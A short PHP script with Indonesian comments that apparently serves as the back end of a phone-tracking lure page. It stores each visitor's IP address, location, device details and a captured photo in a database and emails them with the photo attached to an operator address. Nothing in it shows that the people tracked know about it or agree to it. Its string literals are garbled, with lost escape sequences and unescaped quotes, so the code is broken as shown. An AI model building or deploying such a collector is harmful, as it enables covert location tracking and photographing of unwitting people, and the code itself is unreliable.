<?php
$host = "localhost";
$user = "root";
$pass = "";
$db   = "lacak_hp";

$conn = new mysqli($host, $user, $pass, $db);
if ($conn->connect_error) {
  die("Koneksi gagal: " . $conn->connect_error);
}

$data = json_decode(file_get_contents("php://input"), true);
$ip = $data['ip'] ?? '';
$lokasi = $data['lokasi'] ?? '';
$device = $data['device'] ?? '';
$foto = $data['foto'] ?? '';

$stmt = $conn->prepare("INSERT INTO pengunjung (ip_address, lokasi, perangkat, foto) VALUES (?, ?, ?, ?)");
$stmt->bind_param("ssss", $ip, $lokasi, $device, $foto);
$stmt->execute();
$stmt->close();

// Kirim email dengan lampiran gambar
$to = "your-email@example.com"; // GANTI EMAIL
$subject = "Deteksi Perangkat Baru";
$boundary = md5(uniqid());

$headers = "From: notifikasi@webmu.com
";
$headers .= "MIME-Version: 1.0
";
$headers .= "Content-Type: multipart/mixed; boundary="" . $boundary . ""
";

$message = "--" . $boundary . "
";
$message .= "Content-Type: text/plain; charset=UTF-8
";
$message .= "Content-Transfer-Encoding: 7bit

";
$message .= "IP: $ip
Lokasi: $lokasi
Device: $device

";

$imgData = str_replace('data:image/png;base64,', '', $foto);
$imgData = base64_decode($imgData);

$message .= "--" . $boundary . "
";
$message .= "Content-Type: image/png; name="foto.png"
";
$message .= "Content-Disposition: attachment; filename="foto.png"
";
$message .= "Content-Transfer-Encoding: base64

";
$message .= chunk_split(base64_encode($imgData)) . "
";
$message .= "--" . $boundary . "--";

mail($to, $subject, $message, $headers);
?>
